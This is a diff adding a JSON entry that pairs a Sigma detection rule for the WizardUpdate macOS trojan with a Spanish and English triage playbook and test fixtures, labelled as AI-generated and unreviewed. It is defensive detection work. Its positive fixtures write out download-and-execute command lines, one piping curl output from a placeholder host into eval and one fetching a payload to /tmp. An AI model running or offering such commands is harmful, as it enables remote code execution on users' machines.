@@ -1,0 +1,126 @@
+{
+  "rule": {
+    "id": "f68c4a4f-19ef-4817-952c-50dce331f4b0",
+    "title": "Potential WizardUpdate Malware Infection",
+    "level": "high",
+    "status": "test",
+    "author": "Tim Rauch (rule), Elastic (idea)",
+    "path": "macos/process_creation/proc_creation_macos_wizardupdate_malware_infection.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/macos/process_creation/proc_creation_macos_wizardupdate_malware_infection.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso en macOS mostró patrones de ejecución asociados al troyano WizardUpdate: un shell que ejecuta con eval el resultado de curl, o curl solicitando una ruta con '_intermediate_agent_'.",
+      "what_it_detects": "Eventos process_creation de macOS donde Image termina en '/sh' y CommandLine contiene '=$(curl ' y 'eval' (descarga y ejecución en memoria), o donde Image termina en '/curl' y CommandLine contiene '_intermediate_agent_', cadena observada en la infraestructura de WizardUpdate.",
+      "why_it_matters": "WizardUpdate es un troyano de macOS que roba datos y suele instalar otros payloads maliciosos. Descargar código con curl y ejecutarlo con eval permite al atacante entregar comandos desde un servidor remoto (comando y control) sin dejar archivos evidentes en disco.",
+      "triage_steps": [
+        "Revisar CommandLine completo: identificar la URL o dominio contactado por curl y el contenido que se pasa a eval.",
+        "Identificar el proceso padre (ParentImage, ParentCommandLine) y la cadena de procesos: ¿proviene de un instalador, LaunchAgent, aplicación descargada o Terminal?",
+        "Consultar el dominio o IP de destino en inteligencia de amenazas y en logs de proxy/DNS; buscar otros hosts que lo contacten.",
+        "Revisar procesos hijos del shell o curl en el mismo host dentro de +/- 15 minutos, especialmente osascript, launchctl, chmod, xattr o binarios en /tmp.",
+        "Buscar persistencia nueva en ~/Library/LaunchAgents, /Library/LaunchAgents y /Library/LaunchDaemons creada cerca del evento.",
+        "Verificar el usuario asociado y si instaló recientemente software fuera de la App Store (cracks, actualizadores falsos de Flash o similares).",
+        "Revisar alertas previas para el mismo host y usuario, y comprobar si el endpoint tiene otras detecciones de adware o troyanos."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Scripts internos de administración o instaladores legítimos que usan 'var=$(curl ...)' con eval para obtener configuración; validar con el equipo responsable y la URL de destino."
+      ],
+      "response_steps": [
+        "Confirmar la actividad maliciosa revisando la URL, el contenido descargado (si está disponible) y la cadena de procesos.",
+        "Aislar el endpoint de la red si se confirma la infección y bloquear el dominio o IP en proxy, DNS y firewall.",
+        "Recolectar evidencia: LaunchAgents/LaunchDaemons, binarios sospechosos, hashes y logs unificados antes de limpiar.",
+        "Eliminar persistencia y artefactos maliciosos; considerar reinstalar macOS si hay payloads adicionales.",
+        "Restablecer credenciales del usuario y tokens de sesión del navegador, ya que el troyano puede robar datos.",
+        "Buscar el mismo patrón en toda la flota y documentar IOC encontrados."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque estos patrones de descarga y ejecución remota coinciden con un troyano conocido y rara vez aparecen en uso legítimo."
+    },
+    "en": {
+      "summary": "A macOS process showed execution patterns tied to the WizardUpdate trojan: a shell running curl output through eval, or curl requesting a path containing '_intermediate_agent_'.",
+      "what_it_detects": "macOS process_creation events where Image ends with '/sh' and CommandLine contains both '=$(curl ' and 'eval' (download-and-execute), or where Image ends with '/curl' and CommandLine contains '_intermediate_agent_', a string seen in WizardUpdate infrastructure.",
+      "why_it_matters": "WizardUpdate is a macOS trojan that steals data and often installs additional malicious payloads. Fetching code with curl and running it via eval lets an attacker push commands from a remote server (command and control) without leaving obvious files on disk.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL or domain curl contacts and what is passed to eval.",
+        "Identify the parent (ParentImage, ParentCommandLine) and process tree: installer, LaunchAgent, downloaded app or Terminal?",
+        "Look up the destination domain or IP in threat intel and proxy/DNS logs; find other hosts contacting it.",
+        "Review child processes of the shell or curl on the same host within +/- 15 minutes, especially osascript, launchctl, chmod, xattr or binaries in /tmp.",
+        "Check for new persistence in ~/Library/LaunchAgents, /Library/LaunchAgents and /Library/LaunchDaemons created near the event.",
+        "Confirm the user involved and whether they recently installed software outside the App Store, such as cracked apps or fake updaters.",
+        "Review earlier alerts for the same host and user, including other adware or trojan detections."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "Internal admin scripts or legitimate installers using 'var=$(curl ...)' with eval to pull configuration; validate the URL with the owning team."
+      ],
+      "response_steps": [
+        "Confirm malicious activity by reviewing the URL, downloaded content if available, and the process tree.",
+        "If confirmed, isolate the endpoint and block the domain or IP at proxy, DNS and firewall.",
+        "Collect evidence before cleanup: LaunchAgents/LaunchDaemons, suspicious binaries, hashes and unified logs.",
+        "Remove persistence and malicious artifacts; consider reimaging if additional payloads are present.",
+        "Reset the user's credentials and browser session tokens, since the trojan may steal data.",
+        "Hunt for the same pattern across the fleet and record the IOCs found."
+      ],
+      "severity_rationale": "High fits because these remote download-and-execute patterns match a known trojan and rarely occur in legitimate use."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "sh evaluates the output of curl fetched from a remote server (selection_1)",
+        "event": {
+          "Image": "/bin/sh",
+          "CommandLine": "sh -c x=$(curl -fsSL https://update.example.com/agent/cfg.sh); eval \"$x\"",
+          "ParentImage": "/Users/jperez/Library/Application Support/UpdateHelper/helper",
+          "User": "jperez",
+          "Computer": "MAC-0142",
+          "ProcessId": 4821
+        }
+      },
+      {
+        "description": "curl requests a URL containing the _intermediate_agent_ marker (selection_2)",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -s -L -o /tmp/ia https://cdn.example.org/_intermediate_agent_/macos?id=WS-0142",
+          "ParentImage": "/bin/bash",
+          "User": "jperez",
+          "Computer": "MAC-0142",
+          "ProcessId": 4835
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "sh captures curl output into a variable but only echoes it, no eval",
+        "event": {
+          "Image": "/bin/sh",
+          "CommandLine": "sh -c status=$(curl -s https://status.example.com/health); echo $status",
+          "ParentImage": "/usr/sbin/cron",
+          "User": "root",
+          "Computer": "MAC-0142",
+          "ProcessId": 5102
+        }
+      },
+      {
+        "description": "Legitimate curl download without the _intermediate_agent_ string",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -fsSL -o /tmp/tool.pkg https://downloads.example.com/releases/tool-2.4.pkg",
+          "ParentImage": "/bin/zsh",
+          "User": "jperez",
+          "Computer": "MAC-0142",
+          "ProcessId": 5230
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:12+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
